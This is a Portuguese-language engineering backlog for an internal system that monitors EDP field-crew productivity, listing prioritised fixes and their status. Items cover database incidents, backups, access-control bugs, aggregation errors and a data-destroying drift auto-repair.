# BACKLOG — Ordem estrita, do mais crítico ao menos crítico

> **Regra de ouro:** só trabalhe no próximo item pendente do topo. Não pule.
> Prioridades foram calibradas contra o **contrato Engelmig × EDP** (6 dígitos ×
> 60 meses, iniciado julho/2026 — infraestrutura crítica de negócio).
>
> **Como ler cada item:**
> - **Categoria** — Governança, Segurança, Dados, Ops, Frontend, Backend, Qualidade
> - **Evidência** — file:line que confirma o problema (valide com Read/Grep antes)
> - **Impacto** — o que acontece se ninguém fizer
> - **Ação** — passos concretos
> - **Aceite** — checkboxes que definem "pronto"
> - **Esforço** — estimativa (dev humano; AI é mais rápido)
> - **Rollback** — como reverter se der ruim
> - **Depende de** — outros itens que precisam vir antes
> - **Fonte** — auditoria/documento onde foi levantado
>
> **Ao concluir:** mude status para `done`, adicione data + hash do commit, NÃO
> delete o item. Isso vira histórico.

## Índice rápido de status

| # | Item | Categoria | Status |
|---|---|---|---|
| P0-0 | VM sem swap + Postgres sem auto-restart confiável (INCIDENTE 09/07) | Ops/Infra | **script done** (22/07) — falta swap+systemd (TI) e watchdog (P1-1) |
| P0-1 | Continuidade humana (bus factor 1) | Governança | pending |
| P0-2 | Backup offsite (Postgres) | Ops | **local OK (cron ativo)** — falta só offsite (SFTP→OneDrive manual OU rclone) |
| P0-3 | Matemática de agregação sem teste (A/B/C) | Dados/Qualidade | **done** (f8b839b, 08/07) — transação virou P1-11 |
| P0-4 | `enforceTeamRegional` desligado silenciosamente (v=2) | Segurança/Backend | **done** (a8dcbab, 08/07) |
| P0-5 | POST `/metas` quebrado para não-admin | Backend | **done** (a8dcbab, 08/07) |
| P0-6 | Auto-reparo do drift APAGAVA produção legítima toda noite (07-22 perdeu 172 OS) | Dados | **done** (25/07 código; 31/07 histórico re-consolidado no apply de julho) |
| P0-7 | Auto-reparo do drift ainda podia SUBTRAIR (drift negativo) — 375 OS iriam sumir no sweep de 31/07 | Dados | **done** (31/07) — reparo monotônico + rota manual corrigida; causa-raiz era o P1-16 |
| P1-1 | Alerta ativo (watchdog + Teams) | Ops | **script done** (e4dc4c8) — falta config humana (webhook+crontab) |
| P1-2 | `/health` real (mover antes de catch-all + SELECT 1) | Ops | **done** (bbc5129, 08/07) |
| P1-3 | `snapshot_last_ok` em `app_settings` | Ops | **done** (e4dc4c8, 08/07) |
| P1-4 | SSRF em `/api/wpa/probe` vaza token EDP | Segurança | **done** (bbc5129, 08/07) |
| P1-5 | Rate limit em `/auth/login` + scrypt | Segurança | **código done** (fa62e12) — falta migrar `.env` de prod pra scrypt |
| P1-6 | Git hook `pre-push` roda `node --test` | Qualidade | **done** (e4dc4c8, 08/07) |
| P1-7 | Retry natural pra MD/SF/rejeições | Dados | **done** (4a8e369, 08/07) — subcat MD/SF/DD; rejeições ver nota |
| P1-8 | ~~`consolidateDay` transacional~~ (duplicata de P1-11) | Dados | — ver P1-11 |
| P1-9 | Vendorizar Leaflet + fonte Roboto | Frontend | **done** (c62bf4a, 08/07) |
| P1-10 | Remover vazamento de stack trace | Segurança | **done** (bbc5129, 08/07) |
| P1-11 | `consolidateDay` transacional (rebaixado de P0-3) | Dados | pending (requer staging) |
| P1-12 | Vazamento regional em 7 rotas que ignoravam `req.scope.regionals` | Segurança | **done** (14/07) |
| P1-13 | `_acc` em memória não sobrevive a restart → produção subnotifica em dia de deploy | Dados | **código done** — falta re-consolidar histórico (dry-run mede) |
| P1-14 | Reconexão vira-noite parte a produção do turno em 2 dias (relogin cruza meia-noite) | Dados | **Fases 1+2 código done** (30/07) — falta SÓ re-consolidar histórico (dry-run→revisar→aplicar) |
| P1-15 | Regra rejeitada>concluída aplicada de forma INCONSISTENTE (depende de quando a rejeição foi coletada) | Dados | fix no ar (0ce0a73) + julho re-consolidado 31/07 (−88 OS) · jun/mai pendentes |
| P1-16 | Exclusão de rejeitada casava pelo dia da SESSÃO → nota rejeitada na sexta voltava a contar como produção | Dados | **done** (31/07) — julho re-consolidado e verificado; jun/mai pendentes |
| P1-17 | Junho mede +717 (+5,5%) na re-consolidação — sinal INVERTIDO e errático; NÃO aplicar sem investigar | Dados | pending — investigação |
| P1-18 | `/settings/:key` lia/gravava QUALQUER chave de app_settings só com auth (escalonamento + IDOR) | Segurança | **done** (13/08) — rota restrita à `monitor-filters:<próprio-user>`; 9 testes |
| P1-19 | Aba Histórico travava a regional pra admin (usava `currentRegional`, não `userRegionals`) | Frontend | **done** (13/08, 5e2c17a) — restringia, não vazava |
| P1-20 | Login WPA sem circuit breaker → retry em credencial inválida TRAVA a conta na EDP (incidente 13/08 18h) | Ops/Backend | **código done** (13/08) — breaker por conta + 13 testes; senha do `.env` é ação humana |
| P1-21 | Snapshot era tudo-ou-nada entre contas: uma conta fora derrubava GUA/CAC e travava `snapshot_last_ok` | Ops/Backend | **código done** (14/08) — coleta resiliente por setor + saúde por conta ativa; 5 testes |
| P1-22 | Conta de backup pra SJC (failover): backup só entra quando a primária cai; nunca trava por nossa causa | Ops/Backend | **done** (14/08) — cadeia [sp, sp2]; credencial `sp2` (Luan) no ar, SJC coletando pela backup (teams 64→122); RUNBOOK atualizado |
| P1-23 | `/Notes/{id}/historic` da WPA dá a JANELA DE POSSE da nota por equipe — hoje inferimos isso | Dados | pending — investigar (pode simplificar P1-16 e P2-13) |
| P1-24 | `Interruptions[]` já vem no `details/optimized` que JÁ cacheamos — e ignoramos | Dados | pending — **premissa revista 21/08**: DL/LE/RL JÁ têm motivo e data (auto-descoberta funciona); o valor do item é outro |
| P1-25 | Outro sistema usa a MESMA conta EDP (`clarissa.alves` = nossa `es`) — e faz **relogin por item sem limite**: pode BLOQUEAR o ES sozinho | Ops | pending — **avisar o autor com prioridade** (agravado 20/08) |
| P1-26 | "Equipe não logou" (`/admin/health`) não cruza com a ESCALA do dia → acusa quem está de folga | Dados/Ops | pending — falso positivo diário |
| P2-13 | Upsert de dia antigo sobrescreve com visão parcial → subconta ~0,8% | Dados | pending (conservador, dentro do limiar) |
| P2-14 | `/Sessions/{id}/collaborators` — fecha a lacuna dos Collaborators vazios | Dados | pending |
| P2-15 | `/sessions/{id}/break` (intervalos) + horários previstos — base de "previsto × realizado" e da linha do tempo | Dados | pending — habilita prevenção |
| P2-16 | `filterByExhibitionSector=true` no V2 pode ser a CAUSA do nosso fallback cross-setor (eles não usam e não precisam) | Backend | pending — testar sem o parâmetro |
| P2-17 | Achados menores: placa no histórico, `SessionEndBy`, sinal, `VehicleCategory`, parser de DATE no pgShim, sentinela `0001-01-01` | Dados | pending |
| P2-1 | Testes de contrato de rota (login, scope, health) | Qualidade | **done** (22/07) |
| P2-2 | Extrair matemática de buckets em módulo único | Dados | **done** (22/07) |
| P2-3 | `public/` dedicado (parar de servir raiz do repo) | Segurança/Frontend | **done** (22/07) |
| P2-4 | Escapar dados EDP em `innerHTML` (XSS) | Segurança | **done** (22/07) |
| P2-5 | Tie-breaker `.order('id')` em queries paginadas | Dados | **done** (22/07) |
| P2-6 | `statement_timeout` no pool Postgres | Dados | **done** (22/07) |
| P2-7 | `pg_dump --schema-only` commitado + schema drift | Ops/Dados | **done** (22/07) |
| P2-8 | Extrair CSS pra `css/app.css` (primeiro passo do split) | Frontend | **done** (22/07) — falta validação visual sua |
| P2-9 | Watchdog externo (UptimeRobot/BetterStack) | Ops | pending |
| P2-10 | Persistir estado do `_reclassifyJob` | Backend | **done** (22/07) |
| P2-11 | Andamento por equipe contava nota já concluída (dupla contagem) | Frontend/Dados | **done** (fc2170d, 09/07) |
| P2-12 | Coluna DIAS/MÉDIA dos Gráficos contava linhas (Date-objeto no Set), não dias | Dados | **done** (28/07) — só leitura, sem re-consolidação |
| P3-1 | Dividir `routes/index.js` por domínio | Backend | pending |
| P3-2 | Split incremental do `index.html` (JS por aba) | Frontend | pending |
| P3-3 | Error handler central do Express | Backend | pending |
| P3-4 | Serialização temporal do cron (consolidate vs upsert) | Backend | pending |
| P3-5 | Cap de range em endpoints de histórico (evitar OOM) | Dados | pending |
| P3-6 | Índice de expressão em `note_details` | Dados | pending |
| P3-7 | `pg_advisory_xact_lock` no `pushTeams` | Dados | pending |
| P3-8 | Remover código morto Vercel/Supabase-remote | Backend | **done** (22/07) — junto com Fase 4 |
| P3-9 | Constantes duplicadas (SETORES, ENGELMIG_ID) em módulo único | Backend | pending |
| P3-10 | Acessibilidade básica (role, aria, tabindex) | Frontend | pending |
| P3-11 | "Andamento" ao vivo retém notas transferidas/canceladas (acc) | Dados/Frontend | **done** (22/07) |
| P0-8 | `note_rejections` PK = `note_id`: eu classifiquei como P0 por hipótese. **Duas medições refutaram: impacto ZERO, e a PK composta seria PIOR** | Dados | **fechado como não-problema** (21/08) — resíduo virou P2-32 |
| P1-27 | Histórico multi-dia: Set único nos 3 buckets + dedup por código (não UUID) → nota concluída+rejeitada cai num bucket só | Dados | **código done** (21/08) — Set por bucket + dedup por UUID; 7 testes |
| P1-28 | Checkpoints usam `RegisteredAt2` contra a própria regra documentada 15 linhas acima | Dados/Frontend | **done** (21/08) — TimeStamp UTC primeiro + reparo do cache antigo; 5 testes |
| P1-29 | Breaker é em memória: restart do PM2 zera e crash-loop queima os 5 logins (furo no P1-20) | Ops/Backend | **código done** (21/08) — breaker em app_settings + boot usa getToken; RUNBOOK atualizado |
| P1-30 | `_lastSectorReport` global sobrescrito por request concorrente → saúde verde com setor ausente (furo no P1-21) | Ops/Backend | **done** (21/08) — getTeams(filters, out); 1 teste |
| P1-31 | Nenhum `fetch` da WPA tem timeout + `_singleFlight` nunca solta a promise pendurada → setor travado até restart | Ops/Backend | **done** (21/08) — WPA_HTTP_TIMEOUT_MS (default 20s) nos dois fetch |
| P1-32 | `_classifyLoginError` é fail-open: mensagem nova da EDP = breaker não abre | Ops/Backend | **done** (21/08) — abre cooldown curto na 2ª falha desconhecida; 5 testes |
| P1-33 | `/Notes/{id}/completeInterruptions` → motivo de rejeição uniforme (fecha DL/LE/RL) + a chave que falta ao P0-8 | Dados | pending — **maior alavancagem** |
| P1-34 | `_reconstruirDeslogada` não aplica rejeitada>concluída → card de deslogada conta a nota 2× | Dados/Frontend | **done** (21/08) — 3 testes |
| P2-18 | `note_details` TTL 90d é a única fonte de checkpoints → deslocamento/rota irrecuperável e não-backfillável | Dados | pending |
| P2-19 | Equipe fora da whitelist descartada ANTES do snapshot, sem log → histórico não-backfillável | Dados | pending |
| P2-20 | Leitura do histórico depende da whitelist de HOJE → desativar equipe apaga produção já reportada | Dados/Governança | pending |
| P2-21 | `ConclusionStatus` (pontualidade) + `DesiredConclusionDate` descartados no `normalizarNotaV2` → KPI de SLA a custo zero | Dados/Produto | pending |
| P2-22 | 429/503 não retentados → bucket vazio silencioso indistinguível de "não teve rejeição" | Ops/Dados | pending |
| P2-23 | Lock do snapshot: `finally` da execução antiga libera a nova → execuções sobrepostas em cascata | Ops/Backend | pending |
| P2-24 | Não existe cadastro de escala por dia → o P1-26 não tem onde guardar o dado | Dados/Schema | pending |
| P2-25 | pgShim sem nenhum `setTypeParser`: numeric volta string; `quantidadeExec` tem 2 tipos no mesmo jsonb | Dados/Backend | pending |
| P2-26 | `snapshots` é a única tabela sem chave de idempotência (INSERT puro) | Dados | pending |
| P2-27 | Nota sem `id` tem 3 comportamentos incompatíveis (um deles com `Math.random()` em função "pura") | Dados | pending |
| P2-28 | `collaborators` vazio ao vivo → ranking de rejeições por colaborador sem linhas (aprofunda P2-14) | Dados | pending |
| P2-29 | `*/45` = minutos 0 e 45 (48 logins/dia); RUNBOOK e log de boot dizem 20:30, cron é 23:50 | Ops/Docs | pending |
| P2-30 | Sem orçamento global de concorrência contra a WPA: caudas fire-and-forget fora do lock | Ops | pending |
| P2-31 | Varredura de campos: `Checkpoints[].Try`, `SessionBreakReason.Responsible`, `LastLocationComunication`, `LastUpdateWallet`, `Address` na lista, `Team.Description`, `Assigned[]`, probe do `Team.SectorId`, KB errada sobre placa | Dados | pending |
| P2-32 | Resíduo do P0-8: **VL (1278 rejeições, 100% sem RejectedAt) nunca era tentado** — tipo fora de CANDIDATE_PATHS não faz UMA chamada. Sem RejectedAt o dia vem do arrasto e suprime produção | Dados | **código done** (21/08) — VL/SM mapeados + cache negativo; falta backfill das 1302 linhas |
| P3-12 | `_hojeBRT` com `-3h` fixo sobrevive em 5 lugares apesar do `timeUtil` | Backend | pending (latente) |
| P3-13 | Snapshot persiste os campos `_*`, incluindo cópia da carteira inicial do dia (~16MB/dia) | Dados/Ops | pending |
| P3-14 | Higiene: índice prometido inexistente, `tipoCode '??'`, armadilha do NULL no `pgShim.upsert`, `getSummary` paralelo adormecido, 4 `catch` que engolem erro de dado | Backend/Dados | pending |

---

# P0 — Existencial (fazer nas próximas 2 semanas)

## P0-0 — VM sem swap + Postgres sem auto-restart confiável

- **Categoria:** Ops / Infra
- **Status:** pending
- **Fonte:** INCIDENTE de 09/07/2026 (Postgres caiu em produção).
- **Evidência:** `free -h` mostra `Swap: 0B`. Cluster Postgres é de sistema
  (`pg_lsclusters`: `16 main ... down`, owner `postgres`, sem sudo pro usr_jose
  iniciar — `sudo pg_ctlcluster` retornou "user usr_jose is not allowed").
- **O que aconteceu (registro do incidente):** um backfill rodado como **60
  processos node paralelos** (loop `for d in $(seq 0 60); do node -e ...`), cada
  um abrindo um pool pg (~10 conexões), estourou memória/conexões numa VM de
  3.8GB **sem swap**. O Postgres foi derrubado (OOM). Ficou `down` por ~2min até
  o systemd reerguer sozinho. Durante a janela, o painel ficou `db:error`
  (produção sem dados). Recuperou 100% após o auto-restart + `pm2 restart` +
  re-consolidação do histórico. **Se o dev não estivesse online, teria ficado
  fora até alguém perceber** — exatamente o risco do P0-1.
- **Impacto:** VM sem swap = qualquer pico de memória mata processos direto,
  sem margem. Postgres é o único estado do sistema; se cair e não reerguer,
  o contrato EDP fica sem reporte. O auto-restart funcionou desta vez, mas com
  delay e sem garantia — e ninguém foi alertado (o watchdog do P1-1 ainda não
  está com a config humana feita).
- **Ação (precisa da TI da Engelmig — não é código):**
  1. **Adicionar swap na VM** (2-4GB). Sem sudo o usr_jose não cria swap de
     sistema; pedir à TI: `fallocate -l 4G /swapfile && mkswap && swapon` +
     entrada no `/etc/fstab`. Dá margem contra OOM.
  2. **Garantir auto-restart do Postgres**: confirmar que
     `postgresql@16-main.service` tem `Restart=on-failure` e
     `RestartSec` baixo. Pedir à TI.
  3. **Watchdog alertar em `db:error`** (liga com P1-1): o `/health` já
     retorna `db:error` quando o Postgres cai — o watchdog (quando configurado)
     deve disparar alerta imediato nesse caso, não só em snapshot velho.
  4. **Disciplina de backfill** (código/processo): NUNCA rodar backfill em N
     processos. Sempre 1 processo, sequencial, com pausa. Já documentado no
     RUNBOOK; considerar criar `scripts/backfill-consolidate.js` oficial pra
     não improvisar `node -e` em loop de shell.
- **Aceite:**
  - [ ] `free -h` mostra swap > 0 na VM. *(TI — pendente)*
  - [ ] `systemctl show postgresql@16-main -p Restart` = `on-failure`. *(TI — pendente)*
  - [ ] Watchdog dispara alerta quando `/health` retorna `db:error`. *(liga com P1-1 — config humana pendente)*
  - [x] `scripts/backfill-consolidate.js` existe (1 processo, pausa entre dias). **(done 22/07)**
- **Esforço:** swap + auto-restart = pedido à TI (minutos deles). Script de
  backfill = 1h. Watchdog db:error = incluído no P1-1.
- **Rollback:** N/A (adições de infra/config).
- **Depende de:** acesso da TI da Engelmig (swap/systemd exigem root).
- **Status:** **pending** — o item de CÓDIGO (aceite #4) está feito em
  22/07/2026; os outros 3 aceites dependem da TI da Engelmig (swap/systemd =
  root) e da config humana do watchdog (P1-1). Não dá pra fechar por código.
- **Feito em (parcial, 22/07/2026):** criado `scripts/backfill-consolidate.js`
  — runner oficial de (re)consolidação, single-process e sequencial com pausa,
  dry-run por padrão + `--apply`. Mata a causa raiz do incidente por
  construção: pega um **advisory lock do Postgres** (`pg_try_advisory_lock`) no
  início e RECUSA uma 2ª cópia concorrente (o incidente foram ~60 processos
  node paralelos). O lock é por sessão → solta sozinho se o processo morrer.
  RUNBOOK atualizado pra usar o script (em vez do `node -e` em loop). +10
  testes (`parseArgs`/`rangeDatas`). Suíte 246/246.

## P0-1 — Continuidade humana (bus factor 1)

- **Categoria:** Governança / Operação
- **Status:** pending
- **Fonte:** CTO review 2026-07-08
- **Evidência:** José Zouain é único conhecedor de: senha `wpa_app`
  (SUPERUSER Postgres), conteúdo do `.env` da VM, credenciais Cloudflare
  Worker, credenciais WPA da EDP em `AUTH_USERS`, senha `usr_jose` na VM,
  IP `172.25.3.154` autorizado na EDP. `CHECKPOINT.md:43` documenta
  "senha do wpa_app conhecida só pelo usr_jose".
- **Impacto:** Contrato EDP em risco imediato se José ficar 2+ semanas
  indisponível (doença, luto, oferta, esgotamento). Probabilidade em 60
  meses ≈ 100%. Consequência: reporte diário não sai, EDP questiona, contrato
  pode ser rescindido com penalidades.
- **Ação:**
  1. Escrever `docs/handoff/RUNBOOK.md` de 1-2 páginas cobrindo: como
     reiniciar cron/PM2, como restaurar backup, quem contatar na EDP se der
     problema, como atualizar `AUTH_USERS`, onde ficam as senhas (referência,
     não conteúdo).
  2. Configurar cofre compartilhado (Bitwarden Business ~R$15/user/mês, ou
     KeePass num OneDrive corporativo). Guardar: `.env` completo, senha
     Postgres, credenciais Cloudflare Worker, senha `usr_jose`, credenciais
     WPA EDP, endereço IP autorizado EDP.
  3. Compartilhar leitura com **pelo menos 2 pessoas** (1 da TI da Engelmig,
     1 da diretoria).
  4. Registrar formalmente à diretoria da Engelmig: "sistema que sustenta
     contrato R$X vive em 1 dev. Reforço humano necessário em 90 dias."
     (email ou ata registrado).
- **Aceite:**
  - [ ] `docs/handoff/RUNBOOK.md` existe e cobre os 5 pontos acima.
  - [ ] Cofre criado, credenciais dentro, testado com login pelas 2 pessoas
    adicionais.
  - [ ] Simulação seca: pessoa que nunca tocou o sistema segue o runbook e
    consegue reiniciar tudo (com apoio remoto, mas sem intervenção do José).
  - [ ] Email registrado com a diretoria pedindo reforço formal.
- **Esforço:** 1-2 dias (roteiro humano, não código).
- **Rollback:** N/A — só adição de docs e config de cofre externo.
- **Depende de:** nada.
- **Bloqueia:** todos os outros (pré-requisito emocional de "posso mexer
  sem medo de eu ser o único que sabe").

## P0-2 — Backup offsite do Postgres

- **Categoria:** Operação
- **Status:** **CÓDIGO+DOC done** (22/07/2026) — `scripts/backup-wpa-monitor.sh`
  ganhou a etapa offsite (rclone copy → `onedrive:wpa-backups/` após verificação
  de integridade, + retenção offsite 30d), opt-in com degradação segura (sem
  rclone configurado, segue backup local sem quebrar). Setup passo a passo (install
  sem sudo + OAuth headless do OneDrive + crontab + teste de restore) documentado
  no RUNBOOK.md ("Backup offsite (P0-2)"). **REALIDADE constatada 22/07:** o backup
  LOCAL já rodava automático (cron 03:01, 15 dumps presentes Jul 8→22, ~600M/dia,
  integridade OK, retenção 14d) — a camada mais crítica já estava de pé. **FALTA só
  o OFFSITE.** Caminho leve escolhido: **SFTP→OneDrive manual** (arrastar o dump mais
  recente ~1×/semana; sem rclone). O rclone (automação) ficou opcional/adiado — o
  OAuth headless travou o José (precisa de rclone no Windows). Atenção disco: 8.1G
  em backups; se apertar, baixar RETENTION_DAYS pra 7.
- **Fonte:** CTO review 2026-07-08; auditoria de operação
- **Evidência:** `scripts/backup-wpa-monitor.sh:30` — `BACKUP_DIR=$HOME/backups/wpa_monitor`
  na própria VM. `POSTGRES-MIGRATION.md:262` até reconhece "copie os backups
  pra fora do servidor... não é backup" mas nenhum script implementa.
- **Impacto:** VM ou disco morre → banco + backups desaparecem juntos.
  Histórico operacional desde abril/2026 é irreconstituível (API WPA só
  devolve estado ao vivo). 60 meses de contrato dependendo desse banco.
- **Ação:**
  1. Instalar `rclone` no usuário (sem sudo — binário single-file em
     `~/bin/rclone`).
  2. Configurar `rclone` com OneDrive corporativo do José (M365 já disponível
     via conta @engelmig.com.br; Fortinet libera outbound Microsoft).
  3. Adicionar etapa final em `scripts/backup-wpa-monitor.sh` que faz
     `rclone copy $LATEST_DUMP onedrive:wpa-backups/` após verificação de
     integridade.
  4. Configurar retenção offsite (30 dias) via `rclone --min-age 30d --delete`.
  5. Testar restore uma vez com o dump offsite.
- **Aceite:**
  - [ ] `rclone version` roda no usuário sem sudo.
  - [ ] `rclone lsd onedrive:` lista pastas do OneDrive corporativo.
  - [ ] Backup diário grava também em `onedrive:wpa-backups/YYYY-MM-DD.dump`.
  - [ ] Restore testado: baixar dump do OneDrive + `pg_restore` num banco
    `wpa_monitor_test` funciona.
  - [ ] Aceite documentado em `RUNBOOK.md`.
- **Esforço:** meio dia.
- **Rollback:** Remover a etapa `rclone` do script. Banco continua sendo
  backupado localmente.
- **Depende de:** conta OneDrive corporativa com espaço suficiente
  (~500MB × 30 dias = ~15GB, cabe no M365 padrão).
- **Bloqueia:** nada, mas P0-1 fica incompleto sem isso.

## P0-3 — Matemática de agregação sem teste + `consolidateDay` não-atômico

- **Categoria:** Dados / Qualidade
- **Status:** pending
- **Fonte:** Auditoria de qualidade + auditoria de pipeline (2026-07-08)
- **Evidência:**
  - `services/dataService.js:_buildDiaSummary()` (linhas 226-362) — sem teste
    nenhum. Já produziu bug canc=904/294 documentado no próprio código
    (`dataService.js:313-317`).
  - `services/dataWriter.js:consolidateDay()` (linhas 371-455) — faz `DELETE`
    de `team_daily_totals` D e D-1 seguido de reagregação **sem transação**.
    Crash entre DELETE e INSERT zera o dia.
  - `services/dataWriter.js:_notaDate()` e `:_sessionDate()` (linhas 137-188)
    — regra de negócio central sem teste. Se quebrar, todos os agregados
    quebram silenciosamente.
  - Drift-sweep só cobre D-1 e D-7 (`cronService.js:975-985`). D-2 a D-6
    ficam órfãos se zerarem.
- **Impacto:** Números que aparecem no painel podem estar errados. Se EDP
  auditar 60 meses de reporte e encontrar divergência num dia qualquer,
  contrato marca. Já aconteceu de gerar valor absurdo (904 vs 294) — foi
  detectado no olho; próxima vez pode passar.
- **Ação:**
  1. Criar `test/dataSummary.test.js` que usa `pgShim._setPool()` (infra
     em `test/pgShim.test.js`) pra injetar pool fake respondendo às 3
     queries de `_buildDiaSummary` (first/last/rejections) com fixtures
     pequenas.
  2. Cobrir:
     - UUID em 2 buckets → conta 1× no de maior prioridade
     - UUID no 1º snap que some → cancelada
     - UUID só no último snap → entrada_nova
     - Invariante `inicial + entradas_novas = atual + andamento + concluidas
       + rejeitadas + canceladas` verificada com `assert`
     - Caso do bug 904/294 replicado
  3. Exportar `_notaDate` e `_sessionDate` em `dataWriter.js:module.exports`
     e criar `test/notaDate.test.js` com casos: `conclusionDate` < sessDate
     → dia anterior; vira-noite mantém sessDate; formato inválido → null.
  4. **Refatorar `consolidateDay` pra transação atômica**: usar `_getPool()`
     direto pra `BEGIN`/`DELETE`/`INSERT`/`COMMIT` num único client. Se
     qualquer passo falhar, `ROLLBACK` — dia continua com dado antigo em
     vez de zerado.
  5. Estender `runDailyDriftSweep` pra rodar `detectDrift` em D-1..D-7 (loop
     de 7 chamadas baratas) em vez de só D-1 e D-7.
- **Aceite:**
  - [ ] `test/dataSummary.test.js` roda com 5+ casos, todos passam.
  - [ ] `test/notaDate.test.js` roda com 6+ casos, todos passam.
  - [ ] `consolidateDay` envolve DELETE+INSERT em `BEGIN/COMMIT` com
    `ROLLBACK` em erro.
  - [ ] Drift-sweep cobre D-1 até D-7 (validar em log de próxima 02:00 BRT
    após deploy).
  - [ ] `node --test` sobe de 152 → 165+ testes verdes.
- **Esforço:** 2-3 dias.
- **Rollback:** Reverter o commit da transação (funções puras nos testes
  não têm efeito colateral). Não deixe deployado se testes falharem.
- **Depende de:** P0-1 (pra você poder pedir revisão de outro dev/AI antes
  de deployar mudança destrutiva).
- **Bloqueia:** P3-4 (serialização do cron precisa dessas garantias antes).

## P0-4 — `enforceTeamRegional` desligado silenciosamente

- **Categoria:** Segurança / Backend
- **Status:** pending
- **Fonte:** Auditoria de backend + segurança 2026-07-08
- **Evidência:** `routes/index.js:183` — `if (!req.user || !req.user.regional) return true;`
  O payload v=2 (post-refactor #33) só tem `req.user.regionals` (array).
  `req.user.regional` (singular) é sempre `undefined`. Logo `enforceTeamRegional`
  **sempre retorna `true`** no primeiro branch, e o 403 (linhas 196-201) é
  inalcançável nas 6 rotas que chamam essa função:
  `/totais/subcat`, `/performance/equipes`, `/historico/sessoes`,
  `/historico/equipes`, `/equipes/producao`, `/mapa/equipe`.
- **Impacto:** Defesa em profundidade morta. Um usuário da regional GUA
  passando `?team=ETSJC01` (equipe de SJC) hoje **não é bloqueado por essa
  função**. O `applyScope` ainda intersecta o `regionals`, mas rotas que
  aceitam `?team=` direto passam. Vazamento potencial entre regionais.
- **Ação:**
  1. Ler `routes/index.js:181-206` inteiro.
  2. Substituir `if (!req.user || !req.user.regional) return true;` por
     `if (!req.user || !Array.isArray(req.user.regionals) || req.user.regionals.length === 0) return true;`
  3. Ajustar a lógica interna pra usar `req.user.regionals.includes(teamRegional)`
     em vez da checagem singular.
  4. Adicionar caso em `test/auth.test.js`: user com `regionals: ['GUA']`
     tentando acessar equipe de SJC → 403.
- **Aceite:**
  - [ ] `enforceTeamRegional` usa `req.user.regionals` (array).
  - [ ] Novo teste em `test/auth.test.js` cobre o caso, passa.
  - [ ] `grep -n "req\.user\.regional[^s]" routes/ middleware/ services/`
    retorna zero (garante que não ficou vestígio singular).
- **Esforço:** 1h.
- **Rollback:** Reverter o commit. A guarda estava morta antes, continua morta.
- **Depende de:** P1-6 (git hook pre-push) recomendável antes.

## P0-5 — POST `/metas` quebrado pra não-admin (mesmo bug de P0-4)

- **Categoria:** Backend
- **Status:** pending
- **Fonte:** Auditoria de backend 2026-07-08
- **Evidência:** `routes/index.js:311` — `const userReg = req.user.regional;`
  → `userReg` sempre `undefined`. Linha 322 retorna 403 "Conta sem regional
  vinculada" pra **qualquer usuário não-admin** tentando salvar metas.
  Ironicamente, as linhas 325-330 já usam `req.user.regionals` corretamente
  — só a checagem inicial está errada.
- **Impacto:** Usuários regionais (GUA, CAC, SJC) não conseguem editar
  metas de suas equipes. Funcionalidade regressa desde refactor #33.
- **Ação:**
  1. `routes/index.js:311` — trocar `req.user.regional` por `req.user.regionals`.
  2. Ajustar a lógica de checagem (linhas 313-322) pra usar array (verificar
     se algum item do `regionals` está em `REGIONAIS_VALIDAS`).
  3. Adicionar teste em `test/auth.test.js`: user `guarapari` faz POST
     `/api/metas` → 200 (ou 401 se não passar auth por outra razão, mas
     não 403 "sem regional").
- **Aceite:**
  - [ ] Bug corrigido, teste passa.
  - [ ] Usuário `guarapari` consegue salvar metas via UI (validação manual
    pós-deploy).
- **Esforço:** 30min.
- **Rollback:** Reverter o commit. Regressão volta.
- **Depende de:** nada.

## P0-6 — Auto-reparo do drift APAGAVA produção legítima toda noite

- **Categoria:** Dados
- **Status:** **código done** (25/07) — falta re-consolidar os dias já danificados
- **Fonte:** Validação do efeito colateral do CS (+1571 de julho), 25/07/2026.
  Ferramenta: `scripts/diag-drift-team.js`.
- **Evidência:**
  - Assimetria de janela: `consolidateDay(X)` monta equipes com sessão em
    `{X-1, X}` (`dataWriter.js:_unionTeamsFromSnapshots`) mas **wipa** `{X-1, X}`
    (`dataWriter.js` — `datesToWipe`). Logo quem grava o valor COMPLETO de um dia
    D é o passe de **D+1**: a janela dele inclui as sessões da manhã seguinte, que
    carregam notas concluídas em D por equipe que relogou (`_notaDate` devolve a
    nota pro dia da conclusão quando `conclusionDate < sessDate`).
  - `detectDrift(D)` usava como régua o passe de **D** — que não vê essas sessões
    → subcontava ~6% e acusava a tabela de "inflada". O `runDriftCheck` então
    rodava `consolidateDay(D)`, gravando o valor INCOMPLETO. Auto-reparo destrutivo.
  - Medido no **07-13** (fora da janela do sweep, portanto intacto):
    gravado **903**, passe de D+1 **904**, passe de D **850**. As 21 equipes com
    gap batiam **1:1** com o passe de D+1 (ex.: ECCSJ80 13 gravado = 13 por D+1,
    contra 2 pela régua de D).
  - Dano já consumado no **07-22**: era **1161**, o sweep das 02:00 de 25/07
    "reparou" pra **989** — **−172 OS reais perdidas**.
  - Agravante: `runDailyDriftSweep` varria D-1→D-7 (ordem decrescente), então o
    reparo de um dia estragava o dia seguinte já corrigido — nunca convergia.
- **Impacto:** **Subnotificação silenciosa e recorrente de produção reportável à
  EDP**, atingindo os últimos 7 dias a cada 02:00. Pior classe de bug do projeto:
  o "monitor de integridade" era a própria fonte da corrupção, e o número caía
  sozinho depois de já ter sido reportado. Explica por que o resíduo de julho
  parecia "tabela inflada" — era o contrário.
- **Ação:**
  1. ✅ `detectDrift` passa a usar a régua do write-path: dryRun de **D+1**
     recortado por `r.date === date`. Expõe `repair_date` (= D+1).
  2. ✅ `runDriftCheck` repara via `consolidateDay(report.repair_date)`, não
     `consolidateDay(date)`.
  3. ✅ `runDailyDriftSweep` varre em ordem **crescente** (D-7 → D-1), pra cada
     iteração consertar o colateral da anterior. Só HOJE sobra incompleto —
     coberto pela consolidação das 20:30, pelo cron intraday e pelo sweep de amanhã.
  4. ✅ `_addDays` extraído como helper puro + `test/driftWindow.test.js` (6 casos)
     travando a invariante `passe D+1 >= passe D` e o dedup por UUID (o risco do
     fix seria a janela mais larga inflar — travado por teste).
  5. ⬜ **Re-consolidar os dias danificados** (janela dos sweeps de 24 e 25/07,
     ≈ 07-17..07-24): `node scripts/backfill-consolidate.js 2026-07-17 2026-07-24 --apply`.
     Com o fix no ar o sweep também restaura sozinho, mas conferir é mais rápido.
- **Aceite:**
  - [x] `node --test` 268 → 274 verdes.
  - [x] `diag-drift-team.js` no 07-13 dá veredito "HIPÓTESE CONFIRMADA".
  - [ ] Após deploy: `diag-drift-team.js 2026-07-22` volta a ~1161 (hoje 989).
  - [ ] Log do próximo sweep das 02:00 sem `drift_detected` em cascata nos 7 dias.
